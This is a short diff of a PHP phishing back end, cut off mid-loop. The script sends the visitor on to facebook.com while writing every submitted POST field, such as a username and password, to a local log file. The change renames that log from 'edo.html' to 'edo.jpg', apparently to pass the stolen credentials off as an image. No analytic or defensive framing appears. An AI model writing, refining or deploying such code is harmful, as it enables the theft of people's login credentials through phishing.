@@ -1,6 +1,6 @@
 <?php
 header ('Location: http://www.facebook.com');
-$handle = fopen("edo.html", "a");
+$handle = fopen("edo.jpg", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
